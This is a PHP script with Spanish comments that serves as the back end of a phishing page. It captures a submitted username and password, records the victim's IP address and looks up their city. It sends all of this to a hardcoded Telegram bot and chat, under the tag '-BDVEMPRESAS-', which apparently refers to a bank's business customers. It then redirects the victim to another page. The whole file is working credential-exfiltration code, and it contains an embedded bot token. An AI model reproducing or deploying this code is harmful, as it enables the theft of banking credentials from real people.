<?php
// Datos del formulario
$usuario = $_POST['username'] ?? '';
$clave = $_POST['password'] ?? '';

// Obtener dirección IP del cliente considerando posibles proxies
$direccion_ip = '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $direccion_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // Si hay múltiples IPs en la cadena, toma la primera (IP real del cliente)
    $direccion_ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $direccion_ip = $_SERVER['REMOTE_ADDR'];
}

// Obtener ciudad basada en la dirección IP (usando un servicio externo)
$ciudad = '';
if (!empty($direccion_ip)) {
    $ip_api_url = "http://ip-api.com/json/{$direccion_ip}?fields=city";
    $response = @file_get_contents($ip_api_url);
    if ($response !== false) {
        $json = json_decode($response, true);
        $ciudad = isset($json['city']) ? $json['city'] : 'No disponible';
    }
}

// Token del bot y chat ID del canal (reemplaza con tus valores)
$botToken = '8147135146:AAFsK7Oh99mmfbqkecCcLUgLkWbJrazYT50';
$chatId = '7953434263'; // Puede ser el nombre o el ID numérico del canal

// Mensaje a enviar con formato específico
$mensaje = "-BDVEMPRESAS-:\n";
$mensaje .= "🌐 IP:   <code>$direccion_ip</code>\n";
$mensaje .= "👤 Usr:   <code>$usuario</code>\n";
$mensaje .= "🔑 Clv:   <code>$clave</code>\n";
$mensaje .= "🏙 Ciu:   <code>$ciudad</code>";

// URL de la API de Telegram para enviar mensajes
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Datos a enviar
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

// Configurar la petición
$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    ]
];

// Crear un contexto
$context = stream_context_create($options);

// Enviar el mensaje a Telegram
$result = file_get_contents($telegramUrl, false, $context);

// Verificar si se envió correctamente
if ($result === false) {
    echo "Error al enviar el mensaje.";
} else {
    header('Refresh: 0; URL=w1.html');
    exit;
}
?>
